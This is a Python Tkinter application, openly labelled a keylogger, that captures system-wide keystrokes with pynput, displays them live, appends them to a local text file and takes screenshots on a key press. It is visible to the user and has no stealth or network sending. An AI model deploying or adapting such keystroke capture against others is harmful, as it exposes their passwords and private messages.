import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import os
import time
import pyautogui

# store the pressed keys
pressed_keys = []

# Dictionary to map special keys to readable format
key_map = {
    Key.enter: "\n",
    Key.space: " ",
    Key.backspace: "\b",
    Key.ctrl_l: "Ctrl",
    Key.ctrl_r: "Ctrl",
    Key.shift: "Shift",
    Key.shift_r: "Shift",
    Key.alt: "Alt",
    Key.alt_r: "Alt",
    Key.esc: "Esc"
}

# Function to handle key press event
def on_press(key):
    try:
        pressed_keys.append(key)
        display_keys_realtime(key)
        log_terminal_message(f"{get_current_time()} Key {key} pressed.")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error in on_press: {e}")

# Function to handle the key release event
def on_release(key):
    try:
        if key == Key.esc:
            write_keys_to_file(pressed_keys)
            log_terminal_message(f"{get_current_time()} Logging keys to file...")
            return False
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error in on_release: {e}")

# Function to write pressed keys to a file
def write_keys_to_file(keys):
    try:
        with open("bip.txt", "a") as f:
            for key in keys:
                new_key = key_map.get(key, str(key).replace("'", ""))
                f.write(new_key + " ")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error writing to file: {e}")

# Function to display the pressed keys in the real-time 
def display_keys_realtime(key):
    try:
        new_key = key_map.get(key, str(key).replace("'", ""))
        text_widget.insert(tk.END, new_key + " ")
        text_widget.see(tk.END)

        # Update the human-readable format display
        horizontal_text_widget.config(state=tk.NORMAL)
        horizontal_format = " | ".join(key_map.get(k, str(k).replace("'", " ")) for k in pressed_keys)
        horizontal_text_widget.delete(1.0, tk.END)
        horizontal_text_widget.insert(tk.END, horizontal_format)
        horizontal_text_widget.config(state=tk.DISABLED)
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error in display_keys_realtime: {e}")

# ths Function work  to log terminal messages with timestamp
def log_terminal_message(message):
    try:
        terminal_text_widget.config(state=tk.NORMAL)
        terminal_text_widget.insert(tk.END, message + "\n")
        terminal_text_widget.see(tk.END)
        terminal_text_widget.config(state=tk.DISABLED)
        print(message)
    except Exception as e:
        print(f"{get_current_time()} Error in log_terminal_message: {e}")

# Function to start the keylogger
def start_keylogger():
    global listener
    try:
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Keylogger is running...", fg="green")
        toggle_button.config(text="Stop Keylogger", bg="red", fg="white")
        log_terminal_message(f"{get_current_time()} Keylogger started.")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error starting keylogger: {e}")

# Function to stop the keylogger
def stop_keylogger():
    global listener
    try:
        if listener is not None:
            listener.stop()
            listener = None
        status_label.config(text="Keylogger stopped.", fg="red")
        toggle_button.config(text="Start Keylogger", bg="green", fg="white")
        write_keys_to_file(pressed_keys)
        log_terminal_message(f"{get_current_time()} Keylogger stopped.")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error stopping keylogger: {e}")

# Function to toggle keylogger state
def toggle_keylogger():
    if listener is not None:
        stop_keylogger()
    else:
        start_keylogger()

# Function to clear the log display
def clear_log():
    try:
        confirmed = messagebox.askyesno("Clear Log", "Are you sure you want to clear the log?")
        if confirmed:
            pressed_keys.clear()
            text_widget.delete(1.0, tk.END)
            horizontal_text_widget.config(state=tk.NORMAL)
            horizontal_text_widget.delete(1.0, tk.END)
            horizontal_text_widget.config(state=tk.DISABLED)
            log_terminal_message(f"{get_current_time()} Log cleared.")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error clearing log: {e}")

# to save the log manually
def save_log():
    try:
        if pressed_keys:
            confirmed = messagebox.askyesno("Save Log", "Are you sure you want to save the log?")
            if confirmed:
                write_keys_to_file(pressed_keys)
                messagebox.showinfo("Save Log", "Log saved to bip.txt")
                log_terminal_message(f"{get_current_time()} Log saved to bip.txt")
        else:
            messagebox.showwarning("Save Log", "No keys to save")
            log_terminal_message(f"{get_current_time()} No keys to save")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error saving log: {e}")

# Function to capture screenshot using Pillow
def capture_screenshot():
    try:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot_filename = os.path.join('screenshots', f'screenshot_{timestamp}.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_filename)
        log_terminal_message(f"{get_current_time()} Screenshot saved as {screenshot_filename}")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error capturing screenshot: {e}")

# Function to bind 'S' key to capture screenshot
def bind_screenshot_key(event):
    if event.char == 's':
        capture_screenshot()

# Function to get the current date and time
def get_current_time():
    return time.strftime("%Y-%m-%d %H:%M:%S")

# Function to exit the application
def exit_application():
    try:
        if listener is not None:
            stop_keylogger()
        window.quit()
        log_terminal_message(f"{get_current_time()} Application exited.")
    except Exception as e:
        log_terminal_message(f"{get_current_time()} Error exiting application: {e}")

# Initialize keylogger state
listener = None

# Ensure screenshots folder exists
if not os.path.exists('screenshots'):
    os.makedirs('screenshots')

# Create the main window
window = tk.Tk()
window.title("Keylogger")

# Create a text widget to display the pressed keys
text_widget = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=50, height=10, font=("Arial", 12))
text_widget.pack(padx=10, pady=10)

# Create a horizontal text widget to display the pressed keys in human-readable format
horizontal_text_widget = scrolledtext.ScrolledText(window, wrap=tk.WORD, height=3, font=("Arial", 12))
horizontal_text_widget.pack(padx=10, pady=10)
horizontal_text_widget.config(state=tk.DISABLED)

# Create a terminal text widget to display terminal messages
terminal_text_widget = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=50, height=10, font=("Arial", 12))
terminal_text_widget.pack(padx=10, pady=10)
terminal_text_widget.config(state=tk.DISABLED)

# Create a status label
status_label = tk.Label(window, text="Keylogger is not running.", fg="red", font=("Arial", 14, "bold"))
status_label.pack(padx=10, pady=5)

# Create toggle start/stop button
toggle_button = tk.Button(window, text="Start Keylogger", command=toggle_keylogger, bg="green", fg="white", font=("Arial", 12, "bold"))
toggle_button.pack(side=tk.LEFT, padx=10, pady=5)

# Create clear log button
clear_button = tk.Button(window, text="Clear Log", command=clear_log, font=("Arial", 12))
clear_button.pack(side=tk.LEFT, padx=10, pady=5)

# Create save log button
save_button = tk.Button(window, text="Save Log", command=save_log, font=("Arial", 12))
save_button.pack(side=tk.LEFT, padx=10, pady=5)

# Create exit button
exit_button = tk.Button(window, text="Exit", command=exit_application, font=("Arial", 12))
exit_button.pack(side=tk.RIGHT, padx=10, pady=5)

# Bind the 'S' key to capture screenshot
window.bind('<KeyPress>', bind_screenshot_key)

# Run the Tkinter event loop
window.mainloop()
